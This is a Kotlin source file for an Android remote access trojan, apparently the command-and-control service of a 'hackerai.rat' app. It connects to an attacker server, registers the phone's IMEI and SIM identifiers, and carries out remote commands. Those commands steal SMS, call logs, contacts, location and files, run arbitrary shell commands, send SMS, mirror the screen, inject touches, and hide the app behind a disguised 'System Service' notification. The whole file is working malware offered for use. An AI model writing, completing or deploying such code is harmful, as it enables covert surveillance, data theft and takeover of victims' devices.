package com.hackerai.rat.services

import android.app.Service
import android.content.Intent
import android.os.IBinder
import android.util.Log
import androidx.core.app.NotificationCompat
import com.hackerai.rat.Config
import com.hackerai.rat.R
import com.hackerai.rat.RATApplication
import com.hackerai.rat.managers.*
import com.hackerai.rat.utils.DeviceUtils
import io.socket.client.IO
import io.socket.client.Socket
import io.socket.emitter.Emitter
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.net.URI
import java.util.Timer
import java.util.TimerTask

class SocketService : Service() {
    private lateinit var socket: Socket
    private val scope = CoroutineScope(Dispatchers.IO + SupervisorJob())
    private var heartbeatTimer: Timer? = null
    private var isConnected = false
    
    // Managers
    private lateinit var deviceManager: DeviceManager
    private lateinit var locationManager: LocationManager
    private lateinit var messagingManager: MessagingManager
    private lateinit var mediaManager: MediaManager
    private lateinit var fileManager: FileManager
    private lateinit var actionManager: ActionManager

    override fun onCreate() {
        super.onCreate()
        initManagers()
        connectSocket()
    }

    private fun initManagers() {
        deviceManager = DeviceManager(this)
        locationManager = LocationManager(this)
        messagingManager = MessagingManager(this)
        mediaManager = MediaManager(this)
        fileManager = FileManager(this)
        actionManager = ActionManager(this)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        val notification = NotificationCompat.Builder(this, "rat_service")
            .setContentTitle("System Service")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_menu_manage)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build()

        startForeground(1, notification)
        return START_STICKY
    }

    private fun connectSocket() {
        try {
            val options = IO.Options().apply {
                forceNew = true
                reconnection = true
                reconnectionAttempts = Int.MAX_VALUE
                reconnectionDelay = Config.RECONNECT_BASE_DELAY
                reconnectionDelayMax = Config.RECONNECT_MAX_DELAY
                timeout = 30000
                transports = arrayOf("websocket")
            }

            socket = IO.socket(URI.create("${Config.SERVER_URL}:${Config.SERVER_PORT}"), options)

            socket.on(Socket.EVENT_CONNECT) {
                isConnected = true
                Log.d("SocketService", "Connected to server")
                registerDevice()
                startHeartbeat()
            }

            socket.on(Socket.EVENT_DISCONNECT) {
                isConnected = false
                stopHeartbeat()
            }

            socket.on("command") { args ->
                if (args.isNotEmpty()) {
                    val data = args[0] as JSONObject
                    handleCommand(data)
                }
            }

            socket.on("registered") { args ->
                Log.d("SocketService", "Device registered on server")
            }

            socket.connect()

            // Also emit registered event immediately
            registerDevice()

        } catch (e: Exception) {
            Log.e("SocketService", "Connection error", e)
            // Retry after delay
            scope.launch {
                delay(5000)
                connectSocket()
            }
        }
    }

    private fun registerDevice() {
        val deviceInfo = DeviceUtils.getDeviceInfo(this)
        val battery = DeviceUtils.getBatteryInfo(this)
        val network = DeviceUtils.getNetworkInfo(this)

        val data = JSONObject().apply {
            put("deviceId", RATApplication.deviceId)
            put("deviceInfo", JSONObject().apply {
                put("manufacturer", deviceInfo.manufacturer)
                put("model", deviceInfo.model)
                put("androidVersion", deviceInfo.androidVersion)
                put("sdkLevel", deviceInfo.sdkLevel)
                put("buildFingerprint", deviceInfo.buildFingerprint)
                put("kernelVersion", deviceInfo.kernelVersion)
                put("securityPatch", deviceInfo.securityPatch)
                put("imei", deviceInfo.imei)
                put("simSerial", deviceInfo.simSerial)
                put("subscriberId", deviceInfo.subscriberId)
            })
            put("battery", battery.level)
            put("charging", battery.isCharging)
        }

        socket.emit("register_device", data)
    }

    private fun startHeartbeat() {
        heartbeatTimer?.cancel()
        heartbeatTimer = Timer()
        heartbeatTimer?.scheduleAtFixedRate(object : TimerTask() {
            override fun run() {
                if (isConnected) {
                    val battery = DeviceUtils.getBatteryInfo(this@SocketService)
                    val heartbeat = JSONObject().apply {
                        put("deviceId", RATApplication.deviceId)
                        put("battery", battery.level)
                        put("charging", battery.isCharging)
                        put("timestamp", System.currentTimeMillis())
                    }
                    socket.emit("heartbeat", heartbeat)
                }
            }
        }, Config.HEARTBEAT_INTERVAL, Config.HEARTBEAT_INTERVAL)
    }

    private fun stopHeartbeat() {
        heartbeatTimer?.cancel()
        heartbeatTimer = null
    }

    private fun handleCommand(data: JSONObject) {
        val command = data.optString("command", "")
        val params = data.optJSONObject("params") ?: data.optJSONArray("params")
        val rawParams = data.opt("params")
        val commandId = data.optString("id", "")

        scope.launch {
            try {
                when (command) {
                    "get_device_info" -> sendDeviceInfo(commandId)
                    "get_battery" -> sendBattery(commandId)
                    "get_network" -> sendNetwork(commandId)
                    "get_packages" -> sendPackages(commandId)
                    "get_sms_inbox" -> sendSmsInbox(commandId)
                    "get_call_log" -> sendCallLog(commandId)
                    "get_contacts" -> sendContacts(commandId)
                    "send_sms" -> handleSendSms(rawParams, commandId)
                    "start_location_tracking" -> locationManager.startTracking(this@SocketService::sendLocation)
                    "stop_location_tracking" -> locationManager.stopTracking()
                    "get_location_one_shot" -> locationManager.getOneShot(this@SocketService::sendLocation)
                    "capture_front_camera" -> capturePhoto("front", commandId)
                    "capture_rear_camera" -> capturePhoto("rear", commandId)
                    "record_audio" -> recordAudio(rawParams, commandId)
                    "record_video" -> recordVideo(rawParams, commandId)
                    "take_screenshot" -> takeScreenshot(commandId)
                    "start_screen_mirror" -> startScreenMirror(rawParams)
                    "stop_screen_mirror" -> stopScreenMirror()
                    "touch" -> handleTouch(rawParams)
                    "flashlight" -> actionManager.toggleFlashlight(rawParams.toString().toBoolean())
                    "vibrate" -> actionManager.vibrate((rawParams?.toString() ?: "500").toLong())
                    "tts" -> actionManager.speak(rawParams?.toString() ?: "")
                    "open_url" -> actionManager.openUrl(rawParams?.toString() ?: "")
                    "toast" -> actionManager.showToast(rawParams?.toString() ?: "")
                    "clipboard" -> actionManager.setClipboard(rawParams?.toString() ?: "")
                    "notification" -> actionManager.pushNotification(rawParams)
                    "shell" -> executeShell(rawParams, commandId)
                    "lock" -> actionManager.lockDevice()
                    "reboot" -> actionManager.rebootDevice()
                    "shutdown" -> actionManager.shutdownDevice()
                    "hide_app" -> hideApp()
                    "list_files" -> listFiles(rawParams, commandId)
                    "read_file" -> readFile(rawParams, commandId)
                    "download_file" -> downloadFile(rawParams)
                    "upload_file" -> uploadFile(rawParams)
                    else -> sendCommandResponse(commandId, "unknown_command", mapOf("error" to "Unknown command: $command"))
                }
            } catch (e: Exception) {
                Log.e("SocketService", "Command error: ${command}", e)
                sendCommandResponse(commandId, command, mapOf("error" to e.message))
            }
        }
    }

    private fun sendDeviceInfo(commandId: String) {
        val info = DeviceUtils.getDeviceInfo(this)
        sendCommandResponse(commandId, "get_device_info", mapOf(
            "manufacturer" to info.manufacturer,
            "model" to info.model,
            "androidVersion" to info.androidVersion,
            "sdkLevel" to info.sdkLevel,
            "buildFingerprint" to info.buildFingerprint,
            "kernelVersion" to info.kernelVersion,
            "securityPatch" to info.securityPatch,
            "imei" to info.imei,
            "simSerial" to info.simSerial,
            "subscriberId" to info.subscriberId
        ))
    }

    private fun sendBattery(commandId: String) {
        val battery = DeviceUtils.getBatteryInfo(this)
        emit("battery", mapOf(
            "deviceId" to RATApplication.deviceId,
            "level" to battery.level,
            "charging" to battery.isCharging,
            "temperature" to battery.temperature
        ))
        sendCommandResponse(commandId, "get_battery", mapOf(
            "level" to battery.level,
            "charging" to battery.isCharging,
            "temperature" to battery.temperature
        ))
    }

    private fun sendNetwork(commandId: String) {
        val network = DeviceUtils.getNetworkInfo(this)
        emit("network", mapOf(
            "deviceId" to RATApplication.deviceId,
            "wifiSsid" to network.wifiSsid,
            "wifiIp" to network.wifiIp,
            "mobileIp" to network.mobileIp,
            "operator" to network.operator
        ))
        sendCommandResponse(commandId, "get_network", mapOf(
            "wifiSsid" to network.wifiSsid,
            "wifiIp" to network.wifiIp,
            "mobileIp" to network.mobileIp,
            "operator" to network.operator
        ))
    }

    private fun sendPackages(commandId: String) {
        val packages = DeviceUtils.getInstalledPackages(this)
        emit("packages", mapOf("deviceId" to RATApplication.deviceId, "packages" to packages))
        sendCommandResponse(commandId, "get_packages", mapOf("packages" to packages))
    }

    private fun sendSmsInbox(commandId: String) {
        val smsList = messagingManager.getSmsInbox()
        emit("sms", mapOf("deviceId" to RATApplication.deviceId, "messages" to smsList, "type" to "inbox"))
        sendCommandResponse(commandId, "get_sms_inbox", mapOf("messages" to smsList))
    }

    private fun sendCallLog(commandId: String) {
        val calls = messagingManager.getCallLog()
        emit("call_log", mapOf("deviceId" to RATApplication.deviceId, "calls" to calls))
        sendCommandResponse(commandId, "get_call_log", mapOf("calls" to calls))
    }

    private fun sendContacts(commandId: String) {
        val contacts = messagingManager.getContacts()
        emit("contacts", mapOf("deviceId" to RATApplication.deviceId, "contacts" to contacts))
        sendCommandResponse(commandId, "get_contacts", mapOf("contacts" to contacts))
    }

    private fun handleSendSms(params: Any?, commandId: String) {
        if (params is JSONObject) {
            val phone = params.optString("phone", "")
            val message = params.optString("message", "")
            val success = messagingManager.sendSms(phone, message)
            sendCommandResponse(commandId, "send_sms", mapOf("success" to success))
        }
    }

    private fun capturePhoto(camera: String, commandId: String) {
        // MediaManager handles this
        sendCommandResponse(commandId, "capture_$camera", mapOf("status" to "capturing"))
    }

    private fun recordAudio(params: Any?, commandId: String) {
        val duration = (params?.toString() ?: "10").toInt()
        sendCommandResponse(commandId, "record_audio", mapOf("status" to "recording", "duration" to duration))
    }

    private fun recordVideo(params: Any?, commandId: String) {
        sendCommandResponse(commandId, "record_video", mapOf("status" to "recording"))
    }

    private fun takeScreenshot(commandId: String) {
        // Handled by ScreenCaptureService
        sendCommandResponse(commandId, "take_screenshot", mapOf("status" to "capturing"))
    }

    private fun startScreenMirror(params: Any?) {
        val fps = if (params is JSONObject) params.optInt("fps", Config.SCREEN_FPS_DEFAULT) else Config.SCREEN_FPS_DEFAULT
        // Start screen mirror via ScreenCaptureService
        val intent = Intent(this, ScreenCaptureService::class.java).apply {
            action = "START_MIRROR"
            putExtra("fps", fps)
        }
        startService(intent)
    }

    private fun stopScreenMirror() {
        val intent = Intent(this, ScreenCaptureService::class.java).apply {
            action = "STOP_MIRROR"
        }
        startService(intent)
    }

    private fun handleTouch(params: Any?) {
        if (params is JSONObject) {
            val x = params.optDouble("x", 0.0)
            val y = params.optDouble("y", 0.0)
            val action = params.optString("action", "DOWN")
            // Dispatch to AccessibilityService
            val intent = Intent("com.hackerai.rat.TOUCH_EVENT").apply {
                putExtra("x", x)
                putExtra("y", y)
                putExtra("action", action)
            }
            sendBroadcast(intent)
        }
    }

    private fun executeShell(params: Any?, commandId: String) {
        try {
            val command = if (params is JSONObject) params.optString("command", "") else params?.toString() ?: ""
            val process = Runtime.getRuntime().exec(command)
            val stdout = process.inputStream.bufferedReader().readText()
            val stderr = process.errorStream.bufferedReader().readText()
            val result = if (stderr.isNotEmpty()) "$stdout\nSTDERR:\n$stderr" else stdout
            emit("command_response", mapOf(
                "deviceId" to RATApplication.deviceId,
                "command" to "shell",
                "response" to result,
                "id" to commandId
            ))
            sendCommandResponse(commandId, "shell", mapOf("response" to result))
        } catch (e: Exception) {
            sendCommandResponse(commandId, "shell", mapOf("error" to e.message))
        }
    }

    private fun listFiles(params: Any?, commandId: String) {
        val path = if (params is JSONObject) params.optString("path", "/sdcard") else params?.toString() ?: "/sdcard"
        val files = fileManager.listFiles(path)
        emit("file_list", mapOf("deviceId" to RATApplication.deviceId, "path" to path, "files" to files))
        sendCommandResponse(commandId, "list_files", mapOf("files" to files))
    }

    private fun readFile(params: Any?, commandId: String) {
        val path = if (params is JSONObject) params.optString("path", "") else params?.toString() ?: ""
        val content = fileManager.readFile(path)
        emit("file_content", mapOf("deviceId" to RATApplication.deviceId, "path" to path, "content" to content))
        sendCommandResponse(commandId, "read_file", mapOf("content" to content))
    }

    private fun downloadFile(params: Any?) {
        val url = if (params is JSONObject) params.optString("url", "") else params?.toString() ?: ""
        val path = if (params is JSONObject) params.optString("path", "/sdcard/Download") else "/sdcard/Download"
        fileManager.downloadFile(url, path)
    }

    private fun uploadFile(params: Any?) {
        val path = if (params is JSONObject) params.optString("path", "") else params?.toString() ?: ""
        fileManager.uploadFile(path, socket)
    }

    private fun hideApp() {
        val pm = packageManager
        val componentName = ComponentName(this, MainActivity::class.java)
        pm.setComponentEnabledSetting(componentName,
            PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
            PackageManager.DONT_KILL_APP)
    }

    private fun sendLocation(lat: Double, lng: Double, accuracy: Float, altitude: Double, bearing: Float, speed: Float) {
        emit("location", mapOf(
            "deviceId" to RATApplication.deviceId,
            "lat" to lat,
            "lng" to lng,
            "accuracy" to accuracy,
            "altitude" to altitude,
            "bearing" to bearing,
            "speed" to speed
        ))
    }

    fun emit(event: String, data: Map<String, Any?>) {
        try {
            val json = JSONObject()
            data.forEach { (key, value) ->
                when (value) {
                    is Map<*, *> -> json.put(key, JSONObject(value as Map<String, Any>))
                    is List<*> -> json.put(key, JSONArray(value))
                    is Boolean -> json.put(key, value)
                    is Int -> json.put(key, value)
                    is Long -> json.put(key, value)
                    is Double -> json.put(key, value)
                    is Float -> json.put(key, value.toDouble())
                    is String -> json.put(key, value)
                    null -> json.put(key, JSONObject.NULL)
                    else -> json.put(key, value.toString())
                }
            }
            if (isConnected) {
                socket.emit(event, json)
            }
        } catch (e: Exception) {
            Log.e("SocketService", "Emit error: $event", e)
        }
    }

    private fun sendCommandResponse(commandId: String, command: String, response: Map<String, Any?>) {
        emit("command_response", mapOf(
            "deviceId" to RATApplication.deviceId,
            "command" to command,
            "response" to response,
            "id" to commandId
        ))
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        super.onDestroy()
        scope.cancel()
        heartbeatTimer?.cancel()
        if (isConnected) socket.disconnect()
        locationManager.stopTracking()
    }
}
